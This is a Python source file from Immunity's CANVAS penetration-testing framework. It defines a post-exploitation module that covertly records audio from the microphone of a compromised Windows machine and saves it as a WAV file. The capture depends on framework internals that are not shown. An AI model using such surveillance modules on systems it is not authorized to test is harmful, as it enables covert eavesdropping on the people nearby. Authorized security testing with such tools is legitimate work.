#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2004
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")


import os,getopt
import socket
from exploitutils import *
from internal import *

import canvasengine
import time
import random
import wave

from canvaserror import *
from ExploitTypes.localcommand import LocalCommand

NAME="recordaudio"
DESCRIPTION="Record audio from the microphone"
DOCUMENTATION={}
DOCUMENTATION["Notes"]="""
For commandline use:
MOSDEF\Win32> runmodule recordaudio
"""

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Commands"
PROPERTY['SITE'] = "Local"
PROPERTY['ARCH'] = [ ["Windows"] ]


from engine.config import canvas_root_directory
class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result   = []
        self.name     = NAME
        self.filename = None
        self.vert     = None
        self.hor      = None
        self.seconds  = "10"
	return

    # set progress bar
    def set_progr(self, msg, percent):
        self.setInfo("screengrab - "+msg)
        self.setProgress(percent)
        return

    def run(self):
        rv = 0
        self.host = self.target.interface
        self.setInfo("%s (in progress)"%(NAME))
        self.seconds = int( self.argsDict.get("seconds",self.seconds).strip() )


        for node in self.argsDict["passednodes"]:

            type=node.nodetype
            if "win32api" in node.capabilities:
                outputdir = self.output(ip=node.get_interesting_interface(), subdir="Audio")
                #I'm assuming this opens the file read-write
                #on windows you need to have writable access
                #Lesson Learned: don't use os.tmpfile() for anything portable.
                #tempoutfile=os.tmpfile()
                now  = time.strftime("%m_%d_%Y_%H_%M_%S" , time.localtime())
                data = node.shell.recordaudio(progr=self.set_progr, seconds = self.seconds)
                filename = outputdir + "/sesion_%s.wav" % now
                w    = wave.open( filename, "wb")
                w.setnchannels(2)
                w.setsampwidth(1)
                w.setframerate(44100)
                w.writeframes(data)
                w.close()

                #self.addScreenshot(node, fullbmp, vert, hor)
                msg = "success"
                self.log("Check \"%s\" to listen the wav file" % filename)
                rv = 1
            else:
                self.log("Node of type %s not supported yet."%type)
                rv = -1
                msg = "unsupported"

        self.setInfo("%s - done (%s)"%(NAME, msg))
        return rv



if __name__=="__main__":
    print "You can't run this from the commandline, sorry"
